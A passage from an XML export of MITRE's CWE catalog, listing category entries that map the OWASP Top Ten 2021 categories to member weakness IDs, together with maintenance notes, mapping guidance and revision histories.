            <Has_Member CWE_ID="566" View_ID="1344"/>
            <Has_Member CWE_ID="601" View_ID="1344"/>
            <Has_Member CWE_ID="639" View_ID="1344"/>
            <Has_Member CWE_ID="651" View_ID="1344"/>
            <Has_Member CWE_ID="668" View_ID="1344"/>
            <Has_Member CWE_ID="706" View_ID="1344"/>
            <Has_Member CWE_ID="862" View_ID="1344"/>
            <Has_Member CWE_ID="863" View_ID="1344"/>
            <Has_Member CWE_ID="913" View_ID="1344"/>
            <Has_Member CWE_ID="922" View_ID="1344"/>
            <Has_Member CWE_ID="1275" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1207"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories, which are discouraged for mapping, as well as high-level weaknesses such as Pillars. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1346" Name="OWASP Top Ten 2021 Category A02:2021 - Cryptographic Failures" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A02 category "Cryptographic Failures" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="261" View_ID="1344"/>
            <Has_Member CWE_ID="296" View_ID="1344"/>
            <Has_Member CWE_ID="310" View_ID="1344"/>
            <Has_Member CWE_ID="319" View_ID="1344"/>
            <Has_Member CWE_ID="321" View_ID="1344"/>
            <Has_Member CWE_ID="322" View_ID="1344"/>
            <Has_Member CWE_ID="323" View_ID="1344"/>
            <Has_Member CWE_ID="324" View_ID="1344"/>
            <Has_Member CWE_ID="325" View_ID="1344"/>
            <Has_Member CWE_ID="326" View_ID="1344"/>
            <Has_Member CWE_ID="327" View_ID="1344"/>
            <Has_Member CWE_ID="328" View_ID="1344"/>
            <Has_Member CWE_ID="329" View_ID="1344"/>
            <Has_Member CWE_ID="330" View_ID="1344"/>
            <Has_Member CWE_ID="331" View_ID="1344"/>
            <Has_Member CWE_ID="335" View_ID="1344"/>
            <Has_Member CWE_ID="336" View_ID="1344"/>
            <Has_Member CWE_ID="337" View_ID="1344"/>
            <Has_Member CWE_ID="338" View_ID="1344"/>
            <Has_Member CWE_ID="340" View_ID="1344"/>
            <Has_Member CWE_ID="347" View_ID="1344"/>
            <Has_Member CWE_ID="523" View_ID="1344"/>
            <Has_Member CWE_ID="720" View_ID="1344"/>
            <Has_Member CWE_ID="757" View_ID="1344"/>
            <Has_Member CWE_ID="759" View_ID="1344"/>
            <Has_Member CWE_ID="760" View_ID="1344"/>
            <Has_Member CWE_ID="780" View_ID="1344"/>
            <Has_Member CWE_ID="818" View_ID="1344"/>
            <Has_Member CWE_ID="916" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1208"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories, which are discouraged for mapping, as well as high-level weaknesses such as Pillars. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1347" Name="OWASP Top Ten 2021 Category A03:2021 - Injection" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A03 category "Injection" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="20" View_ID="1344"/>
            <Has_Member CWE_ID="74" View_ID="1344"/>
            <Has_Member CWE_ID="75" View_ID="1344"/>
            <Has_Member CWE_ID="77" View_ID="1344"/>
            <Has_Member CWE_ID="78" View_ID="1344"/>
            <Has_Member CWE_ID="79" View_ID="1344"/>
            <Has_Member CWE_ID="80" View_ID="1344"/>
            <Has_Member CWE_ID="83" View_ID="1344"/>
            <Has_Member CWE_ID="87" View_ID="1344"/>
            <Has_Member CWE_ID="88" View_ID="1344"/>
            <Has_Member CWE_ID="89" View_ID="1344"/>
            <Has_Member CWE_ID="90" View_ID="1344"/>
            <Has_Member CWE_ID="91" View_ID="1344"/>
            <Has_Member CWE_ID="93" View_ID="1344"/>
            <Has_Member CWE_ID="94" View_ID="1344"/>
            <Has_Member CWE_ID="95" View_ID="1344"/>
            <Has_Member CWE_ID="96" View_ID="1344"/>
            <Has_Member CWE_ID="97" View_ID="1344"/>
            <Has_Member CWE_ID="98" View_ID="1344"/>
            <Has_Member CWE_ID="99" View_ID="1344"/>
            <Has_Member CWE_ID="113" View_ID="1344"/>
            <Has_Member CWE_ID="116" View_ID="1344"/>
            <Has_Member CWE_ID="138" View_ID="1344"/>
            <Has_Member CWE_ID="184" View_ID="1344"/>
            <Has_Member CWE_ID="470" View_ID="1344"/>
            <Has_Member CWE_ID="471" View_ID="1344"/>
            <Has_Member CWE_ID="564" View_ID="1344"/>
            <Has_Member CWE_ID="610" View_ID="1344"/>
            <Has_Member CWE_ID="643" View_ID="1344"/>
            <Has_Member CWE_ID="644" View_ID="1344"/>
            <Has_Member CWE_ID="652" View_ID="1344"/>
            <Has_Member CWE_ID="917" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1209"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include high-level Class and/or Pillar weaknesses. The CWE Program will work with OWASP to improve these mappings, possibly including modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1348" Name="OWASP Top Ten 2021 Category A04:2021 - Insecure Design" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A04 "Insecure Design" category in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="73" View_ID="1344"/>
            <Has_Member CWE_ID="183" View_ID="1344"/>
            <Has_Member CWE_ID="209" View_ID="1344"/>
            <Has_Member CWE_ID="213" View_ID="1344"/>
            <Has_Member CWE_ID="235" View_ID="1344"/>
            <Has_Member CWE_ID="256" View_ID="1344"/>
            <Has_Member CWE_ID="257" View_ID="1344"/>
            <Has_Member CWE_ID="266" View_ID="1344"/>
            <Has_Member CWE_ID="269" View_ID="1344"/>
            <Has_Member CWE_ID="280" View_ID="1344"/>
            <Has_Member CWE_ID="311" View_ID="1344"/>
            <Has_Member CWE_ID="312" View_ID="1344"/>
            <Has_Member CWE_ID="313" View_ID="1344"/>
            <Has_Member CWE_ID="316" View_ID="1344"/>
            <Has_Member CWE_ID="419" View_ID="1344"/>
            <Has_Member CWE_ID="430" View_ID="1344"/>
            <Has_Member CWE_ID="434" View_ID="1344"/>
            <Has_Member CWE_ID="444" View_ID="1344"/>
            <Has_Member CWE_ID="451" View_ID="1344"/>
            <Has_Member CWE_ID="472" View_ID="1344"/>
            <Has_Member CWE_ID="501" View_ID="1344"/>
            <Has_Member CWE_ID="522" View_ID="1344"/>
            <Has_Member CWE_ID="525" View_ID="1344"/>
            <Has_Member CWE_ID="539" View_ID="1344"/>
            <Has_Member CWE_ID="579" View_ID="1344"/>
            <Has_Member CWE_ID="598" View_ID="1344"/>
            <Has_Member CWE_ID="602" View_ID="1344"/>
            <Has_Member CWE_ID="642" View_ID="1344"/>
            <Has_Member CWE_ID="646" View_ID="1344"/>
            <Has_Member CWE_ID="650" View_ID="1344"/>
            <Has_Member CWE_ID="653" View_ID="1344"/>
            <Has_Member CWE_ID="656" View_ID="1344"/>
            <Has_Member CWE_ID="657" View_ID="1344"/>
            <Has_Member CWE_ID="799" View_ID="1344"/>
            <Has_Member CWE_ID="807" View_ID="1344"/>
            <Has_Member CWE_ID="840" View_ID="1344"/>
            <Has_Member CWE_ID="841" View_ID="1344"/>
            <Has_Member CWE_ID="927" View_ID="1344"/>
            <Has_Member CWE_ID="1021" View_ID="1344"/>
            <Has_Member CWE_ID="1173" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1210"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories, which are discouraged for mapping, as well as high-level weaknesses such as Pillars. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1349" Name="OWASP Top Ten 2021 Category A05:2021 - Security Misconfiguration" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A05 category "Security Misconfiguration" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="2" View_ID="1344"/>
            <Has_Member CWE_ID="11" View_ID="1344"/>
            <Has_Member CWE_ID="13" View_ID="1344"/>
            <Has_Member CWE_ID="15" View_ID="1344"/>
            <Has_Member CWE_ID="16" View_ID="1344"/>
            <Has_Member CWE_ID="260" View_ID="1344"/>
            <Has_Member CWE_ID="315" View_ID="1344"/>
            <Has_Member CWE_ID="520" View_ID="1344"/>
            <Has_Member CWE_ID="526" View_ID="1344"/>
            <Has_Member CWE_ID="537" View_ID="1344"/>
            <Has_Member CWE_ID="541" View_ID="1344"/>
            <Has_Member CWE_ID="547" View_ID="1344"/>
            <Has_Member CWE_ID="611" View_ID="1344"/>
            <Has_Member CWE_ID="614" View_ID="1344"/>
            <Has_Member CWE_ID="756" View_ID="1344"/>
            <Has_Member CWE_ID="776" View_ID="1344"/>
            <Has_Member CWE_ID="942" View_ID="1344"/>
            <Has_Member CWE_ID="1004" View_ID="1344"/>
            <Has_Member CWE_ID="1032" View_ID="1344"/>
            <Has_Member CWE_ID="1174" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1211"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories, which are discouraged for mapping. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1352" Name="OWASP Top Ten 2021 Category A06:2021 - Vulnerable and Outdated Components" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A06 category "Vulnerable and Outdated Components" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="937" View_ID="1344"/>
            <Has_Member CWE_ID="1035" View_ID="1344"/>
            <Has_Member CWE_ID="1104" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1212"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories, which are discouraged for mapping. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1353" Name="OWASP Top Ten 2021 Category A07:2021 - Identification and Authentication Failures" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A07 category "Identification and Authentication Failures" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="255" View_ID="1344"/>
            <Has_Member CWE_ID="259" View_ID="1344"/>
            <Has_Member CWE_ID="287" View_ID="1344"/>
            <Has_Member CWE_ID="288" View_ID="1344"/>
            <Has_Member CWE_ID="290" View_ID="1344"/>
            <Has_Member CWE_ID="294" View_ID="1344"/>
            <Has_Member CWE_ID="295" View_ID="1344"/>
            <Has_Member CWE_ID="297" View_ID="1344"/>
            <Has_Member CWE_ID="300" View_ID="1344"/>
            <Has_Member CWE_ID="302" View_ID="1344"/>
            <Has_Member CWE_ID="304" View_ID="1344"/>
            <Has_Member CWE_ID="306" View_ID="1344"/>
            <Has_Member CWE_ID="307" View_ID="1344"/>
            <Has_Member CWE_ID="346" View_ID="1344"/>
            <Has_Member CWE_ID="384" View_ID="1344"/>
            <Has_Member CWE_ID="521" View_ID="1344"/>
            <Has_Member CWE_ID="613" View_ID="1344"/>
            <Has_Member CWE_ID="620" View_ID="1344"/>
            <Has_Member CWE_ID="640" View_ID="1344"/>
            <Has_Member CWE_ID="798" View_ID="1344"/>
            <Has_Member CWE_ID="940" View_ID="1344"/>
            <Has_Member CWE_ID="1216" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1213"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. These mappings include categories, which are discouraged for mapping, as well as high-level weaknesses. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1354" Name="OWASP Top Ten 2021 Category A08:2021 - Software and Data Integrity Failures" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A08 category "Software and Data Integrity Failures" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="345" View_ID="1344"/>
            <Has_Member CWE_ID="353" View_ID="1344"/>
            <Has_Member CWE_ID="426" View_ID="1344"/>
            <Has_Member CWE_ID="494" View_ID="1344"/>
            <Has_Member CWE_ID="502" View_ID="1344"/>
            <Has_Member CWE_ID="565" View_ID="1344"/>
            <Has_Member CWE_ID="784" View_ID="1344"/>
            <Has_Member CWE_ID="829" View_ID="1344"/>
            <Has_Member CWE_ID="830" View_ID="1344"/>
            <Has_Member CWE_ID="915" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1214"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1355" Name="OWASP Top Ten 2021 Category A09:2021 - Security Logging and Monitoring Failures" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A09 category "Security Logging and Monitoring Failures" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="117" View_ID="1344"/>
            <Has_Member CWE_ID="223" View_ID="1344"/>
            <Has_Member CWE_ID="532" View_ID="1344"/>
            <Has_Member CWE_ID="778" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1215"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="1356" Name="OWASP Top Ten 2021 Category A10:2021 - Server-Side Request Forgery (SSRF)" Status="Incomplete">
         <Summary>Weaknesses in this category are related to the A10 category "Server-Side Request Forgery (SSRF)" in the OWASP Top Ten 2021.</Summary>
         <Relationships>
            <Has_Member CWE_ID="918" View_ID="1344"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-1216"/>
            <Reference External_Reference_ID="REF-1206"/>
         </References>
	 <Notes>
	   <Note Type="Maintenance">As of CWE 4.6, the relationships in this category were pulled directly from the CWE mappings cited in the 2021 OWASP Top Ten. The CWE Program will work with OWASP to improve these mappings, possibly requiring modifications to CWE itself.</Note>
	 </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2021-10-05</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="16" Name="Configuration" Status="Obsolete">
         <Summary>Weaknesses in this category are typically introduced during the configuration of the software.</Summary>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>14</Entry_ID>
               <Entry_Name>Server Misconfiguration</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>15</Entry_ID>
               <Entry_Name>Application Misconfiguration</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
	 <References>
	   <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
	 </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Prohibited (this CWE ID must not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: this entry is a Category. Using categories for mapping has been an actively discouraged practice since at least 2019.  Categories are informal organizational groupings of weaknesses that help navigation and browsing by CWE users, but they are not weaknesses in themselves [REF-1287]. This CWE entry may have become widely-used because of NIST's usage in NVD from 2008 to 2016 (see CWE-635 view, updated to the CWE-1003 view in 2016). Mapping is also Prohibited because this entry's status is Obsolete.</xhtml:p>
               <xhtml:p>Comments: As of CWE 4.9, "Configuration" is beginning to be treated as an aspect of the SDLC in which a product is directed (by a human or automated process) to perform an insecure behavior. CWE mapping should be conducted by analyzing the weakness in the behavior that has been set by the configuration, such as those related to access control (descendants of CWE-284) or resource management (CWE-400), etc.</xhtml:p>
	    </Note>
            <Note Type="Maintenance">Further discussion about this category was held over the CWE Research mailing list in early 2020. No definitive action has been decided.</Note>
            <Note Type="Maintenance">This entry is a Category, but various sources map to it anyway, despite CWE guidance that Categories should not be mapped. In this case, there are no clear CWE Weaknesses that can be utilized. "Inappropriate Configuration" sounds more like a Weakness in CWE's style, but it still does not indicate actual behavior of the product. Further research is still required, however, as a "configuration weakness" might be Primary to many other CWEs, i.e., it might be better described in terms of chaining relationships.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, References</Modification_Comment>
				</Modification>
         </Content_History>
      </Category>
      <Category ID="2" Name="7PK - Environment" Status="Draft">
         <Summary>This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that are typically introduced during unexpected environmental conditions. According to the authors of the Seven Pernicious Kingdoms, "This section includes everything that is outside of the source code but is still critical to the security of the product that is being created. Because the issues covered by this kingdom are not directly related to source code, we separated it from the rest of the kingdoms."</Summary>
         <Relationships>
            <Has_Member CWE_ID="11" View_ID="700"/>
            <Has_Member CWE_ID="12" View_ID="700"/>
            <Has_Member CWE_ID="13" View_ID="700"/>
            <Has_Member CWE_ID="14" View_ID="700"/>
            <Has_Member CWE_ID="5" View_ID="700"/>
            <Has_Member CWE_ID="6" View_ID="700"/>
            <Has_Member CWE_ID="7" View_ID="700"/>
            <Has_Member CWE_ID="8" View_ID="700"/>
            <Has_Member CWE_ID="9" View_ID="700"/>
         </Relationships>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2017-11-08">Environment</Previous_Entry_Name>
         </Content_History>
      </Category>
      <Category ID="255" Name="Credentials Management Errors" Status="Draft">
         <Summary>Weaknesses in this category are related to the management of credentials.</Summary>
         <Relationships>
            <Has_Member CWE_ID="256" View_ID="699"/>
            <Has_Member CWE_ID="257" View_ID="699"/>
            <Has_Member CWE_ID="260" View_ID="699"/>
            <Has_Member CWE_ID="261" View_ID="699"/>
            <Has_Member CWE_ID="262" View_ID="699"/>
            <Has_Member CWE_ID="263" View_ID="699"/>
            <Has_Member CWE_ID="324" View_ID="699"/>
            <Has_Member CWE_ID="521" View_ID="699"/>
            <Has_Member CWE_ID="523" View_ID="699"/>
            <Has_Member CWE_ID="549" View_ID="699"/>
            <Has_Member CWE_ID="620" View_ID="699"/>
            <Has_Member CWE_ID="640" View_ID="699"/>
            <Has_Member CWE_ID="798" View_ID="699"/>
            <Has_Member CWE_ID="916" View_ID="699"/>
         </Relationships>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
	 <References>
	   <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
	 </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Prohibited (this CWE ID must not be used to map to real-world vulnerabilities).</xhtml:p>
